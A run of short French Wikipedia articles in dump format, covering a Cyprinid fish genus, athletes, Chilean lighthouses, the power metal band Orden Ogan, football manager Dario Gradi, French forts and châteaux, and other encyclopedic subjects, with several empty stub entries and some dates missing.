Squalidus est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes. Squalidus est un genre qui se rencontre en Asie orientale.
Liste des espèces.
Selon :

</doc>
<doc id="9412169" url="https://fr.wikipedia.org/wiki?curid=9412169" title="Clement Kemboi">
Clement Kemboi

Clement Kemboi Kimutai, né le et mort le , est un athlète kenyan, spécialiste du 3 000 m steeple.
Biographie.
En , il remporte le titre lors des Jeux africains de Brazzaville.
Son meilleur temps est de 8 min 12 s 68 obtenu au Stade de France le .

</doc>
<doc id="9412171" url="https://fr.wikipedia.org/wiki?curid=9412171" title="(4568) Menkaure">
(4568) Menkaure



</doc>
<doc id="9412172" url="https://fr.wikipedia.org/wiki?curid=9412172" title="After School (homonymie)">
After School (homonymie)



</doc>
<doc id="9412173" url="https://fr.wikipedia.org/wiki?curid=9412173" title="Clement Kemboi Kimutai">
Clement Kemboi Kimutai



</doc>
<doc id="9412178" url="https://fr.wikipedia.org/wiki?curid=9412178" title="Raja africana">
Raja africana



</doc>
<doc id="9412179" url="https://fr.wikipedia.org/wiki?curid=9412179" title="(6174) Polybius">
(6174) Polybius



</doc>
<doc id="9412181" url="https://fr.wikipedia.org/wiki?curid=9412181" title="John Cheffers">
John Cheffers

 John Cheffers ( Melbourne, Australie - Le ) a été le deuxième directeur de l'Institut de Sport Australien. Il a pris la succession de Don Talbot en tant que Directeur AIS en 1984 et est resté dans ce rôle jusqu'en 1986. Ronald Harvey a pris la direction de l'Institut après son départ. Cheffers était un professeur d'éducation et coordonnateur du programme au mouvement humain Université de Boston et contribué beaucoup de publications sur le sport et l'éducation physique.
Cheffers a connu la notoriété à titre d'entraîneur d'athlétisme. Son athlète la plus accomplie a été Jean Roberts qui a remporté plusieurs médailles d'argent aux Jeux du Commonwealth et de bronze au lancer du disque et lancer du poids pendant les années 1960 et 1970. Il a également joué quatre matchs avec les Carlton dans le Victorian Football League en 1955
, ainsi que d'être un conseiller de fitness à Hawthorn Football Club au milieu des années 1960.
En 1968 Cheffers est devenu l'entraîneur athlétique en chef pour le Zimbabwe, alors appelé la Rhodésie. Ses expériences de coaching de l'équipe multiraciale qui a été sélectionné sont détaillées dans son livre "A Wilderness of Spite: Rhodesia Denied". Cette équipe s'est vu refusé l'entrée au Mexique pour les Jeux Olympiques par le gouvernement mexicain, et a été, de fait, interdit des Jeux olympiques à ce point. Cheffers a une forte croyance, à la suite de cette époque, que la politique ne doivent pas interférer dans le sport. Mathias Kanda, Bernard Dzoma et Robson Mrombe sont les coureurs de fond notoires que John a entraînés en 1968.
En 1969 Cheffers a été nommé entraîneur d'athlétisme en chef pour la Papouasie-Nouvelle-Guinée et les a mené aux troisième Jeux du Pacifique Sud à Port Moresby, en Nouvelle-Guinée.
Après avoir reçu sa maîtrise en éducation en 1970, et son doctorat d'Éducation en 1973, les deux de Temple University a Philadelphie, Cheffers déplacée vers le nord à Boston où il a travaillé pour Université de Boston. En 1972, Cheffers fondé l'École éducation physique du mardi au jeudi an sein du Programme d'éducation de l'Université de Boston.
Le travail de Cheffers sur la violence dans le sport a été présenté dans "Sports Illustrated".
Après son mandat à l'Australian Institute of Sport, Cheffers retourné dans le monde universitaire et a été président de AIESEP (Association Internationale des Écoles Supérieures d'Éducation Physique) de 1984 à 1998.
Cheffers est décédé le à bord d'un vol de San Francisco à Sydney. Il a été survécu par son épouse, Margaret, ses quatre enfants, Paul, Marc, Leigh et Andrew, et 17 petits-enfants.

</doc>
<doc id="9412189" url="https://fr.wikipedia.org/wiki?curid=9412189" title="Nach Pout' (journal)">
Nach Pout' (journal)

Nach Pout' (en russe : "Наш Путь", Notre Voie) était un quotidien, fondé par Konstantin Rodzaïevsky, le , qui a été distribué à Harbin (de 1933 à 1941) et à Shanghai (1941-1943).
Il a été publié jusqu'en et ce journal était l'organe officiel du parti fasciste russe. Ce journal promeut le christianisme orthodoxe, le nationalisme et le fascisme.
Il a été édité par Konstantin Rodzaïevsky de 1933 à 1943 et le tirage quotidien était estimé à . Il y avait une maison d'édition : "Izdatel'stvo gazety "Nash Put’"" ().

</doc>
<doc id="9412192" url="https://fr.wikipedia.org/wiki?curid=9412192" title="Fort de Mons-en-Laonnois">
Fort de Mons-en-Laonnois

Le fort de Mons-en-Laonnois, parfois appelé fort de Laniscourt et brièvement fort Sérurier, est un fort du système Séré de Rivières, situé dans le département français de l'Aisne.
Histoire.
Le fort a été érigé sur la commune de Mons-en-Laonnois, limitrophe de celle de Laniscourt, de 1874 à 1885, afin de contrer une éventuelle attaque des Allemands juste après la guerre franco-allemande de 1870. Il visait à contrer une invasion depuis la Belgique. Le fort possédait un poste optique pour communiquer avec la place de Laon et deux batteries annexes ; ses fossés étaient défendus par deux caponnières doubles. L'ensemble était armé avec 19 pièces d'artillerie et sa garnison pouvait s'élever à 280 hommes.
À la suite du développement d'obus chargés à la mélinite par Eugène Turpin en 1886, les fortifications sont rendues obsolètes car incapables de leur y résister. Il est alors décidé de ne pas rénover le fort, du fait de coûts jugés trop importants.
En 1887, le nom du maréchal Jean Mathieu Sérurier lui est attribué.
Durant les Première et Seconde Guerres mondiales, les Allemands stockaient leurs victuailles dans le fort. Repris par les Français, il est devenu un entrepôt de munitions jusqu'en 1963, atteignant jusqu'à 950 tonnes de munitions stockées.
Le 25 juin 1940, le fort reçoit la visite d'Adolf Hitler tandis que la bataille de France touche à sa fin. En effet, Hitler avait été affecté dans la région durant la Première Guerre mondiale et à la suite de la capitulation française, ce dernier a parcouru l'Aisne ainsi que la Marne entre le 21 et le 26 juin 1940.
À l'été 1944, les forces Allemandes se replient et le fort est libéré.
C'est en 1998 que le fort est définitivement démilitarisé, puis sera racheté par la commune de Mons-en-Laonnois en l'an 2000.

</doc>
<doc id="9412194" url="https://fr.wikipedia.org/wiki?curid=9412194" title="Puits de Saint-Patrice">
Puits de Saint-Patrice



</doc>
<doc id="9412195" url="https://fr.wikipedia.org/wiki?curid=9412195" title="Phare Islotes Evangelistas">
Phare Islotes Evangelistas



</doc>
<doc id="9412196" url="https://fr.wikipedia.org/wiki?curid=9412196" title="Orden Ogan">
Orden Ogan

Orden Ogan est un groupe de power metal allemand, originaire d'Arnsberg.
Biographie.
Débuts et Yonah Records (1996–2008).
Le groupe est formé en 1996 par Sebastian Levermann, Sebastian Grütling et le bassiste Sebastian Severin sous le nom de Tanzende Aingewaide mais rebaptisé un an plus tard en Orden Ogan. Le nom du groupe se traduit par , avec d'une part (traduit de l'allemand pour "Orden") et d'autre part (traduit du celtique pour "Ogan"). 
Le groupe publie tout d'abord trois démos : "Into Oblivion" en 1997, "Anthem to the Darkside" en 1998 et "Soli Deo Gloria" en 1999. C'est en 2004 qu'ils auto produisent leur premier album "Testimonium A.D." sur lequel on peut entendre l'utilisation de flûtes, de hautbois et d'autres instruments à vent. En 2008, ils signent un contrat avec Yonah Records qui leur permet de sortir leur deuxième album "Vale", le premier à être publié sous un label. 
"Easton Hope" et "To The End" (2009-2013).
En octobre 2009, le groupe change de label et signe un contrat avec AFM Records. Le est publié l'album "Easton Hope". En conséquence, des clips vidéos sont tournés pour "Easton Hope" ainsi que pour "We Are Pirates".
En 2010, le groupe participe lors du festival du Wacken Open Air. C'est lors de ce festival qu'a été annoncé que l'album "Vale", alors épuisé, allait être réédité le par leur label AFM Records. À la fin de l'année, le groupe effectue une tournée européenne avec le groupe suédois Tiamat avant d'enchaîner une petite série de concerts avec Van Canto et InLegend. De mars à , Orden Ogan fait l'ouverture de la tournée de Grave Digger. 
Annoncé à l'origine pour le , le quatrième album du groupe, "To the End", est finalement publié le . En novembre 2012 s'ensuit une tournée européenne avec Freedom Call et les groupes italiens Vexillum et Luca Turilli's Rhapsody. Durant l'été 2013, Orden Ogan se produit sur d'autres festivals, comme le Summer Breeze Open Air avant de se produire l'année suivante lors de festivals internationaux tels que le Trondheim Metal Fest en Norvège et le ProgPower US aux États-Unis.
"Ravenhead" et "Gunmen" (2014-2019).
Le , le groupe annonce la sortie de leur cinquième album. Celui-ci s'intitule "Ravenhead" et sort le . Un premier extrait de l'album est publié le sous forme de clip vidéo sur YouTube, il s'intitule "F.E.V.E.R". Un deuxième extrait, "Ravenhead", est quant à lui dévoilé le . 
Durant le mois de janvier 2015, le groupe accompagne Hammerfall et Serious Black pour une tournée européenne avant d'effectuer une autre tournée en automne avec Powerwolf et Xandria. Le , le groupe publie un coffret CD/DVD, "The Book of Ogan", en Europe via AFM Records. Le , le groupe dévoile la pochette, ainsi que la date de sortie de leur sixième album. Celui-ci s'intitule "Gunmen" et est prévu pour le . Plusieurs extraits sont dévoilés : le , ils mettent en ligne sur YouTube le clip vidéo de "Gunman", ainsi que "Fields of Sorrow" le . 
Une semaine après la publication de l'album, le groupe annonce son classement dans les charts allemands avec une huitième place. Il atteint même la treizième place dans les charts suédois, la sixième place en Belgique, ainsi que la quatrième place aux États-Unis. 
Le , sur sa page Facebook, le groupe annonce des changements dans la composition du groupe. Steven Wussow, bassiste du groupe Xandria, rejoint le groupe également en tant que bassiste. Nils Löffler cède alors sa place et prend en charge la guitare, tandis que Sebastian Levermann conserve son poste de chanteur et claviériste.
"Final Days" (depuis 2019).
Le le groupe annonce la sortie de son nouvel album qui s'intitule "Final Days". Dans ce nouvel concept album, il est question que la mascotte Allister Vale évolue dans un monde de science fiction sombre et mélancolique. L'album est prévu pour le , toujours sous le label AFM Records. Dans le même temps, une tournée européenne est annoncée, avec Grave Digger comme première partie, démarrant le . 
En raison de l'épidémie de Covid-19, l'album est finalement repoussé au 13 novembre 2020, ainsi que la tournée promotionnelle qui est ainsi prévue d'être entamée le 09 avril 2021 à Geiselwind. Ce sont finalement Wind Rose et Brothers of Metal qui sont annoncés comme première partie. C'est dans ce contexte que le groupe confirme le départ de son guitariste Tobias Kersting et son remplacement par Patrick Sperling. 
Après avoir dévoilé "In the Dawn of the AI" le 24 juillet 2020, Orden Ogan publie son deuxième single "Heart of the Android" le 04 décembre 2020. L'épidémie de Covid-19 oblige le groupe à repousser une nouvelle fois la sortie de l'album au 12 mars 2021. 

</doc>
<doc id="9412197" url="https://fr.wikipedia.org/wiki?curid=9412197" title="Richard Taylor (missionnaire)">
Richard Taylor (missionnaire)

Richard Taylor (né le - mort le ) est un missionnaire C.M.S. en Nouvelle-Zélande. Il était présent lors de la signature du Traité de Waitangi. Il a écrit de nombreux livres au sujet de l'environnement naturel et culturel de la Nouvelle-Zélande au cours de cette année. Taylor a écrit "A leaf from the natural history of New Zealand" (1848).
Il a été nommé directeur de l'école à la Station de Mission de Waimate et il a rejoint la station de mission de C.M.S. en 1842, à Whanganui.
Il a nommé les colonies le long de la rivière Whanganui Ātene (Athènes), Koriniti (Corinthe), Hiruhārama (Jérusalem), Rānana (Londres) et la banlieue de Taylorville (Whanganui) est nommée d'après lui.

</doc>
<doc id="9412198" url="https://fr.wikipedia.org/wiki?curid=9412198" title="Pierre Motteux">
Pierre Motteux



</doc>
<doc id="9412201" url="https://fr.wikipedia.org/wiki?curid=9412201" title="Dario Gradi">
Dario Gradi

Dario Gradi, né le 8 juillet 1941, est un entraîneur de football anglais, d'origine italienne. Sa carrière est étroitement liée au club de Crewe Alexandra, où il travaille pendant plus de 30 ans. Il en est depuis 2011 le directeur sportif. 
Gradi est l'entraîneur de Crewe pendant 24 ans, de 1983 à 2007. Il devient alors directeur sportif et laisse la responsabilité de l'équipe première à Steve Holland. Il était alors l'entraîneur connaissant la plus grande longévité parmi les clubs professionnels anglais. Après deux nouveaux intérims à la tête de l'équipe première, Gradi quitte définitivement le poste de manager en novembre 2011 pour se concentrer sur l'école de football du club. Il est membre de l'Ordre de l'Empire britannique.
Carrière de joueur.
Né d'un père italien et d'une mère anglaise, Gradi s'installe à Londres avec sa mère après le décès de sa mère et la fin de la seconde Guerre mondiale.
Diplômé comme professeur d'éducation physique à la Loughborough University, il est nommé à la "Glyn Grammar School" d'Epsom. Il quitte cependant l'enseignement pour une carrière modeste de footballeur, à Sutton United, Tooting &amp; Mitcham United et Wycombe Wanderers notamment. Gradi est recruté comme "Regional Coach" par la Fédération anglaise, ce qui l'oblige à mettre un terme à sa carrière amateur.
Après une période d'enseignement, Gradi rejoint Chelsea comme entraîneur adjoint en 1971, à 29 ans. Il travaille ensuite à Sutton United, Derby County et Wimbledon, avant d'être pendant deux ans entraîneur de jeunes à Leyton Orient.
Carrière de manager.
Wimbledon.
Gradi est nommé manager de Wimbledon en janvier 1978. Le club obtient sa première promotion de "Football League Fourth Division" en 1979, mais est relégué la saison suivante. En course avec son club pour un retour en "Football League Third Division", Gradi reçoit en février 1981 une offre de Crystal Palace, club de "First Division" dont le président Ron Noades arrive lui aussi de Wimbledon.
Crystal Palace.
Le passage de Gradi au Selhurst Park est infructueux. Il ne parvient pas à sauver l'équipe de la relégation, et démissionne en novembre 1982 après un début de saison décevant.
Crewe Alexandra.
Gradi retrouve un poste de manager en juin 1983 à Crewe Alexandra, un club habitué au bas de tableau en "Fourth Division". Peu à peu, il va faire remonter le club dans la hiérarchie du football anglais.
En 1989, le club est promu en "Third Division", après 25 saisons au plus bas niveau national. Gradi signe un contrat de dix ans avec son club. L'équipe est reléguée mais fait son retour au national, devenu la "Division Two", en 1994 et trois ans plus tard, atteint la "Division One".
En 1994, Gradi devient l'entraîneur à la plus grande longévité parmi les entraîneurs professionnels anglais. En 2002, ils ne sont que deux, Alex Ferguson de Manchester United et lui, à être en poste depuis les années 1980. Il est nommé par la suite au sein du conseil d'administration du club.
Le contrat de Gradi avec Crewe est assez controversé car il est financièrement intéressé aux bénéfices réalisés sur les transferts des joueurs du club
Dans les années 1980 et 1990, Gradi voit l'éclosion de nombreux joueurs réputés, comme David Platt, futur capitaine de la sélection anglaise, Rob Jones, Geoff Thomas, Danny Murphy, Ashley Ward, Wayne Collins, Seth Johnson, Robbie Savage ou encore Neil Lennon. Dans les années 2000, Rob Hulse, Dean Ashton, David Vaughan, Michael O'Connor, Billy Jones, Nicky Maynard, Ashley Westwood ou encore Nick Powell.
Il est réputé pour ses talents de détection des jeunes talents. Son nom est cité pour devenir directeur technique de la fédération anglaise en 1996. En janvier 1998, il est fait membre de l'Ordre de l'Empire britannique pour les services rendus au football anglais.
Crewe Alexandra remporte le trophée "PFA Bobby Moore" du Fair Play à douze reprises en quinze années sous le règne de Gradi.
Le 20 avril 2007 Gradi annonce son retrait en fin de saison. Il devient directeur technique du club, et laisse à Steve Holland la responsabilité de l'équipe première. Gradi était le manager le plus ancien en poste en Angleterre.
Le 18 novembre 2008, Gradi reprend la charge de l'équipe en intérim, après un début de saison manqué et le départ de Steve Holland. Il cède la place, un peu plus d'un mois plus tard, à Gudjon Thordarson. Après le licenciement de Thordarson le 2 octobre 2009, Gradi redevient le manager du club.
Le 10 novembre 2011, Gradi annonce son retour au poste de directeur du football. Son adjoint et ancien joueur Steve Davis prend sa suite. Davis conduit Crewe en "League 1" en mai 2012. En novembre 2016, il est suspendu par la Fédération anglaise de football, puis banni en mars 2021 à la suite d'un scandale d'abus sexuels sur mineur dans le football anglais dans lequel la FA l'a tenu responsable d'avoir connu les faits et de ne pas avoir agi.
Reconnaissance.
Gradi est nommé au English Football Hall of Fame en 2004 en reconnaissance de son impact en tant que manager sur le football anglais. Une rue de Crewe est baptisée à son honneur. 

</doc>
<doc id="9412202" url="https://fr.wikipedia.org/wiki?curid=9412202" title="Hri Souani">
Hri Souani

Le Hri Souani est un grenier et monument historique situé à Meknès. Il servait principalement à stocker les denrées alimentaires, et possède de grandes écuries. Il a été construit par Moulay Ismaïl au .

</doc>
<doc id="9412205" url="https://fr.wikipedia.org/wiki?curid=9412205" title="Phare des îlots Fairway">
Phare des îlots Fairway

Le phare des îlots Fairway (en ) est un phare du Chili situé sur les îlots Fairway dans le détroit de Magellan à l’entrée du canal Smyth. Il est rattaché administrativement à la région de Magallanes et de l'Antarctique chilien. La ville la plus proche est Punta Arenas. Habité, il est destiné à la navigation du Pacifique et du détroit de Magellan.
Histoire.
George Slight, désigné par le gouvernement chilien du président Montt, dessina et participa à la direction de la construction du phare qui fut inauguré le . C’est l’ingénieur Sabino López qui dirigea les travaux. À cette date, le système du feu était automatique jusqu’à la construction en 1946 de la maison du gardien. À partir de cette date, le phare est habité. 
Description.
le Phare est une tour de de forme octogonale peinte de bandes rouges et blanches horizontalement. La maison du gardien est une maison d’un étage de avec 7 salles. Il émet, à une hauteur focale de , un éclat blanc toutes les 5 secondes. Sa portée est de 19 mille nautiques (environ 35 km).
Identifiant : ARLHS : CHI-055 - Amirauté : G1480 - NGA : 111-2320 .

</doc>
<doc id="9412208" url="https://fr.wikipedia.org/wiki?curid=9412208" title="Dindon noir de Sologne">
Dindon noir de Sologne

Le dindon noir de Sologne, noir de Sologne, dindon de Sologne ou solognot est une race de dindon française.
Description.
C'est une race à faible effectif, originaire et principalement élevée dans la région éponyme ; de taille moyenne au plumage noir et aux pattes noir bleuté. Le dindon noir de Normandie et le dindon de Norfolk sont des variétés issues du noir de Sologne. C'est une race rustique particulièrement réputée autant pour la ponte que pour sa chair.
Reproduction.
La dinde de race « noir de Sologne » est reconnue comme bonne pondeuse et bonne couveuse. Elle peut couver en moyenne 15 de ses propres œufs ; il est possible de lui donner à couver des œufs d'autres races :

</doc>
<doc id="9412209" url="https://fr.wikipedia.org/wiki?curid=9412209" title="(2832) Lada">
(2832) Lada

(2832) Lada est un astéroïde de la ceinture principale découvert par Nikolaï Tchernykh, le . Il a été nommé d'après Lada, la déesse du printemps slave.

</doc>
<doc id="9412211" url="https://fr.wikipedia.org/wiki?curid=9412211" title="Raie-guitare">
Raie-guitare



</doc>
<doc id="9412214" url="https://fr.wikipedia.org/wiki?curid=9412214" title="Félix Sardá y Salvany">
Félix Sardá y Salvany

Félix Sardà y Salvany, né à Sabadell dans la banlieue de Barcelone le et mort dans la même ville le est un prêtre catholique espagnol connu comme étant une figure de proue de la lutte contre le libéralisme.
Son œuvre la plus connue est "Le libéralisme est un péché" publiée en 1884 et rééditée plusieurs fois. Le livre reçut l'approbation de la Sacrée Congrégation de l'Index le . De son vivant, il fit don de sa maison afin d'y établir un asile pour personnes âgées.

</doc>
<doc id="9412215" url="https://fr.wikipedia.org/wiki?curid=9412215" title="Guitare de mer">
Guitare de mer



</doc>
<doc id="9412216" url="https://fr.wikipedia.org/wiki?curid=9412216" title="Raies-guitares">
Raies-guitares



</doc>
<doc id="9412218" url="https://fr.wikipedia.org/wiki?curid=9412218" title="The Girl Next Door (film, 1953)">
The Girl Next Door (film, 1953)



</doc>
<doc id="9412220" url="https://fr.wikipedia.org/wiki?curid=9412220" title="5 colonnes à la une">
5 colonnes à la une



</doc>
<doc id="9412223" url="https://fr.wikipedia.org/wiki?curid=9412223" title="Château de la Cassemichère">
Château de la Cassemichère

Le château de la Cassemichère est un édifice du , qui se trouve sur le territoire de la commune française de La Chapelle-Heulin, en Loire-Atlantique. Il est le centre d'une exploitation viticole, et donne son nom à plusieurs vins, nommés "La Cassemichère" ou "château Cassemichère".
Histoire.
Le manoir et la terre de la Cassemichère sont en possession de la famille de Baye au début du , puis, à la fin du , entre les mains de la famille Pantin.
Le bâtiment est reconstruit en 1601 pour Roland Giraud, sieur de la Cassemichière, riche négociant en draps de soie à Nantes. Celui-ci est consul, puis échevin de la ville de 1620 à 1622. La famille Giraud possède de nombreuses terres autour de Vallet. Le onzième fils de Roland, Mathurin Giraud, devient maire de Nantes entre 1664 et 1666.
En 1739, le domaine est vendu par une Giraud de la Tourelle à François Cottineau, négociant, échevin, consul de Nantes de 1749 à 1751. La famille Cottineau compte plusieurs marchands, très impliqués dans le commerce maritime, y compris la traite négrière. François Cottineau est procureur du Roi à l'Amirauté.
La famille Le Loup de La Biliais en hérite peu avant la Révolution française mais le châtelain et son épouse sont guillotinés sur la place du Bouffay, à Nantes, en 1794, pour avoir caché un prêtre réfractaire. La propriété est alors mise sous séquestre, puis rachetée, plus tard, par leur fils.
Durant le Second Empire, la propriété laissée à l'abandon est morcelée.
Rachetée par un négociant en vin, Donatien Bahuaud, le château de la Cassemichère est rénové et remanié par ce dernier entre 1955 et 1960.
Architecture.
Les portes et le décor des lucarnes sont typiques du début du . Dans la cave, entre 1955 et 1960, le sculpteur nantais Auguste Pichaud réalise, à la demande du propriétaire Donatien Bahuaud, décore les corbeaux avec des bas-reliefs représentant des saynètes ayant pour thème le vin et la gourmandise, notamment certaines figurant Bacchus, ou une autre où Adam et Ève mangeant le fruit défendu.

</doc>
<doc id="9412224" url="https://fr.wikipedia.org/wiki?curid=9412224" title="Petit tenquin">
Petit tenquin



</doc>
<doc id="9412231" url="https://fr.wikipedia.org/wiki?curid=9412231" title="Wilber Sánchez">
Wilber Sánchez

Wilber Sánchez est un lutteur cubain spécialiste de la lutte gréco-romaine né le à Santiago de Cuba.
Biographie.
Wilber Sánchez participe aux Jeux olympiques d'été de 1992 à Barcelone dans la catégorie des poids super-mouches et remporte la médaille de bronze.

</doc>
<doc id="9412232" url="https://fr.wikipedia.org/wiki?curid=9412232" title="Chapelle Saint-Pierre-de-Léneyrac">
Chapelle Saint-Pierre-de-Léneyrac

La chapelle Saint-Pierre-de-Léneyrac (ou ancien ermitage Saint-Pierre-de-Léneyrac) est une chapelle préromane située à Ceyras dans le département français de l'Hérault en région Occitanie.
Elle constitue, avec les chapelles Saint-Laurent de Moussan, Saint-Nazaire de Roujan, Saint-Michel de Sournia, Saint-Martin-de-Fenollar, Saint-Jérôme d'Argelès et Saint-Georges de Lunas, un témoin de l'architecture préromane de tradition wisigothique en Septimanie, région qui correspond aux actuelles régions du Roussillon et du Languedoc qui ont fait partie intégrante du royaume wisigothique de Toulouse (419-507) et du royaume wisigothique de Tolède (507-711).
Historique.
La chapelle, construite aux , est un ancien oratoire annexe de Saint-Étienne-de-Rougas.
Elle est mentionnée en 1275 sous le nom d"Ecclesia paræcialis S. Stephani de Rogatio cum oratorio S. Petri ei annexo". 
Statut patrimonial.
La chapelle fait l'objet d'une inscription au titre des monuments historiques depuis le .

</doc>
<doc id="9412235" url="https://fr.wikipedia.org/wiki?curid=9412235" title="Phare Bahía Félix">
Phare Bahía Félix

Le phare Bahía Félix (en ) ou phare San Félix, est un phare du Chili situé sur l'île Tamar, dans la partie occidentale du détroit de Magellan. Il est rattaché administrativement à la région de Magallanes et de l'Antarctique chilien. 
Il est géré par le Service hydrographique et océanographique de la marine chilienne dépendant de la Marine chilienne. 
Le phare est classé Monument national du Chili depuis .
Histoire.
Le phare, mis en service le sur (île Tamar), est destiné à la navigation du Pacifique et du détroit de Magellan. Contrairement aux autres principaux phares construits par George Slight dans le détroit de Magellan, celui-ci se compose d’une tour métallique et la maison du gardien se trouve à part. Son système optique provient de la firme anglaise 
Description.
Le phare est une tour cylindrique en fonte, avec une galerie et une lanterne de de haut, attachée à une maison de gardien. La tour est peinte en blanc avec une bande rouge centrale et la lanterne est rouge. Il émet, à une hauteur focale de , un éclat blanc par période de 15 secondes. Sa portée est de 21 milles nautiques (environ 39 km).
Identifiant : ARLHS : CHI-007 - Amirauté : G1404 - NGA : 110-20368 .

</doc>
<doc id="9412236" url="https://fr.wikipedia.org/wiki?curid=9412236" title="Jana Herzen">
Jana Herzen

Jana Herzen est une autrice compositrice-interprète influencée par les musiques folk, musiques du monde, rock et jazz.
Elle est la fondatrice de la maison de disque Motéma Music à Harlem, qui s'est spécialisée dans le jazz et les musiques du monde.
Parmi les artistes de son label, on peut citer Gregory Porter, Ginger Baker, Monty Alexander, Kellylee Evans, Randy Weston, Charnett Moffett, Geri Allen, Lynne Arriale, Rufus Reid, Marc Cary, Jean-Michel Pilc, Lakecia Benjamin et René Marie.
Le terme "Motéma" signifie "cœurs" en lingala.

</doc>
<doc id="9412240" url="https://fr.wikipedia.org/wiki?curid=9412240" title="Île Herschel (Chili)">
Île Herschel (Chili)

L’île Herschel (en ) est une petite île appartenant à l'archipel des îles L'Hermite, situé dans le passage de Drake, au sud-est de l'archipel de la Terre de Feu. L'île est rattachée administrativement à la province de l'Antarctique chilien, dans la région de Magallanes et de l'Antarctique chilien, au Chili. Elle a été nommée par Robert FitzRoy en 1830 en l'honneur de l’astronome britannique William Frederick Herschel.
Géographie.
L'île Herschel occupe une position centrale au sein de l'archipel des îles L'Hermite. Elle est entourée par les îles Wollaston (et la petite île Seddle) au nord, par l'île Freycinet au nord-est et par l'île Deceit à l'est. Elle est séparée de ces quatre îles par le canal Franklin et le passage de Mar del Sud. 
Au sud de l'île Herschel se trouve l'île Horn, sur laquelle se détache le cap Horn. Enfin, l'île L'Hermite, l'île Jerdán, l'île Chanticleer, l'île Hall et la petite île Saddle sont situées à l'ouest de l'île.
Les côtes de l'île présentent une forme irrégulière, elles sont découpées par de nombreuses baies, dont la plus importante est la baie San Francisco (au nord-ouest de l'île), à l'embouchure de laquelle se trouve la petite île Arrecife.
L'île Herschel est située au centre du parc national Cabo de Hornos et de la « Reserva de Biosfera Cabo de Hornos ». L'île possède un climat océanique sub-polaire ("Cfc", selon la classification de Köppen), froid et humide toute l'année, avec des vents violents, venant généralement de l'ouest. Elle présente des côtes escarpées, battues par les vagues de la mer de la zone australe.

</doc>
<doc id="9412241" url="https://fr.wikipedia.org/wiki?curid=9412241" title="Gunnar Törnqvist">
Gunnar Törnqvist

Gunnar Törnqvist, né le à Ljungby et mort le , est un géographe suédois, spécialiste en théorie de la localisation, en diffusion de l'innovation et en développement régional.
Formation et carrière académique.
Gunnar Törnqvist obtient son doctorat de l'Université de Stockholm en 1963 avec une thèse consacrée aux localisations industrielles. Il y devient professeur la même année avant d'être recruté à l'université de Lund où il est nommé professeur de géographie économique et entre à l'Académie royale des sciences en 1990. Il est aujourd'hui professeur émérite à l'université de Lund.
En tant qu'expert, Törnqvist a réalisé de nombreux rapports pour le gouvernement suédois, des comités et des délégations. Au niveau européen, il est lié à diverses infrastructures de recherche dont l' et la Fondation Européenne de la Science.
Recherches.
Dans ses recherches, Törnqvist a notamment montré, avec son collègue Torsten Hägerstrand, l'importance croissante des interactions sociales dans les choix de localisation des entreprises : il en donne un aperçu avec une perspective historique dans "Sverige i nätverkens Europa" (1993, "La Suède dans le réseau européen"). Contrairement à ce que l'on pourrait penser, les deux géographes suédois ont montré la grande importance du contact en face-à-face dans la croissance de l'industrie des télécommunications (de l'économie du savoir), et donc de leur implantation en ville. Törnqvist a également travaillé sur la diffusion spatiale des innovations, le développement local et régional et les divisions administratives en Suède. Récemment, il a notamment étudié les impacts de la liaison fixe entre Malmö et Copenhague (pont de l'Oresund), le rôle des universités dans la société contemporaine et la géographie de la créativité.

</doc>
<doc id="9412242" url="https://fr.wikipedia.org/wiki?curid=9412242" title="Université Paris Diderot Paris 7">
Université Paris Diderot Paris 7



</doc>
<doc id="9412245" url="https://fr.wikipedia.org/wiki?curid=9412245" title="Hakkı Başar">
Hakkı Başar

Hakkı Başar est un lutteur turc spécialiste de la lutte gréco-romaine né le à Sakarya.
Biographie.
Hakkı Başar participe aux Jeux olympiques d'été de 1992 à Barcelone dans la catégorie des poids mi-lourds et remporte la médaille d'argent.

</doc>
<doc id="9412246" url="https://fr.wikipedia.org/wiki?curid=9412246" title="Paula Hawkins">
Paula Hawkins

Paula Hawkins (née le ) est une écrivain britannique, connue pour son roman "La Fille du train".
Biographie.
Hawkins est née à Salisbury (actuelle Harare) en Rhodésie (actuel Zimbabwe) où elle a grandi. Son père était professeur d'économie et journaliste financier. Sa famille quitte le Zimbabwe et déménage à Londres en 1989 alors qu'elle a 17 ans. Elle étudie la philosophie, la politique et l'économie à l'université d'Oxford. Elle écrit des articles sur les affaires pour "The Times", tout en écrivant plusieurs articles en indépendant et rédige un livre de conseils financiers pour les femmes, "The Money Goddess". 
Vers 2009, Hawkins commence sa carrière de romancière en écrivant des fictions romantiques sous le pseudonyme d’Amy Silver. Elle rencontre le succès commercial en abandonnant le ton comique de ses premières nouvelles pour un style plus sombre et plus sérieux. Avec "La Fille du train" de 2015, elle écrit un thriller abordant les thèmes de la violence domestique et de l'alcoolisme féminin. Hawkins a écrit le livre en six mois, alors qu'elle était dans une situation financière difficile, et a dû emprunter de l'argent à son père pour pouvoir le terminer. Le livre est un grand succès, inattendu pour l'auteur dont le dernier livre avait été un échec, puisqu'il se vend à plus de 18 millions d'exemplaires .
Elle vit désormais dans le sud de Londres.

</doc>
<doc id="9412255" url="https://fr.wikipedia.org/wiki?curid=9412255" title="Comté angevin de Piémont">
Comté angevin de Piémont

Le comté angevin de Piémont est un État féodal qui a été créé, dans le sud du Piémont par le comte de Provence Charles Ier d'Anjou-Naples.
L'histoire.
La création.
En 1304, le roi Charles II d'Anjou-Naples décide de reprendre les territoires que son père avait possédés en Piémont et en Lombardie, et d'abord ceux que le marquis de Saluces Manfred IV de Saluces détenait. Il nomme gouverneur du comté de Provence, du comté de Forcalquier et du Comté de Piémont, son fils Raymond-Béranger et envoie, avec le titre de sénéchal du Piémont, Raynal de Lecto (en italien : ), le maître de son hôtel, accompagné de 100 cavaliers et de deux cents arbalétriers reprendre les seigneuries paternelles.
Le sénéchal qui a complété ses troupes avec des renforts provençaux, reprend alors, les villes d'Alba, de Cherasco, de Savillan et de Mondovi. La dédition de Mondovi a lieu le . Celle-ci stipule la destruction et l'interdiction de reconstruire les châteaux de Roccaforte, de Breo, Lovazanico , Guasco et Villanova.
L'entreprise fut favorisée par l'inaction du marquis de Saluces. Sous la conduite de Jacques Arduins (en italien : ), procureur et avocat du roi de Naples, vice-régent de Ricardo di Gambatesa, sénéchal de Provence, les hommes d'armes fournis par la viguerie de Sospel, s'emparent, en passant par le col de Fenestre, de la vallée du Gesso et de la vallée de la Stura di Demonte. Ils prennent le , Rocca Sparvièra.
